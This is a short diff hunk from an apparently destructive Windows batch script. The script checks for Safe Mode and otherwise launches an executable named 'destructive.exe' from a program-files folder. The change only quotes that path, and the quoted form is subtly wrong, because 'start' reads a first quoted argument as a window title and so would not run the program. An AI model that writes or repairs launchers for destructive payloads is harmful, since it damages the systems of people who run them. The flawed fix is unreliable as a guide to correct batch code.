@@ -133,7 +133,7 @@ if %errorlevel% == 0 (
     echo Safe Mode is enabled, proceeding with actions...
 ) else (
     echo Safe Mode is not enabled
-    start c:\program files\utkudrk2\destructive.exe
+    start "c:\program files\utkudrk2\destructive.exe"
     exit
 )
 
